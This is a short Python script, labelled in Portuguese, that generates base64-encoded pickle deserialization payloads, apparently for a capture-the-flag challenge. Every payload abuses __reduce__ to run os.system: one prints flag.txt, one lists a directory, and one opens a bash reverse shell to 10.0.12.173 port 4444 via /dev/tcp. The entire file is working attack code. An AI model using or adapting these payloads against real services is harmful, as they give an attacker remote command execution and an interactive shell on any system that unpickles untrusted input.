import pickle
import base64
import os

print("=" * 60)
print("Gerador de Payloads - Pickle Deserialization")
print("=" * 60)
print()

# Ler arquivo
print("[1] Payload para curl")
print("-" * 60)

class Read:
    def __reduce__(self):
        return (os.system, ('cat flag.txt',))

payload1 = base64.b64encode(pickle.dumps(Read())).decode()
print(payload1)
print()

# Listar diretório
print("[2] Payload para listar diretório:")
print("-" * 60)

class Listar:
    def __reduce__(self):
        return (os.system, ('ls -la',))

payload2 = base64.b64encode(pickle.dumps(Listar())).decode()
print(payload2)
print()

# Reverse shell
print("[3] Payload para reverse shell (EXEMPLO):")
print("-" * 60)

class Reverse:
    def __reduce__(self):
        cmd = ('bash -c "bash -i >& /dev/tcp/10.0.12.173/4444 0>&1"',)
        return (os.system, cmd)

payload3 = base64.b64encode(pickle.dumps(Reverse())).decode()
print(payload3)
print()
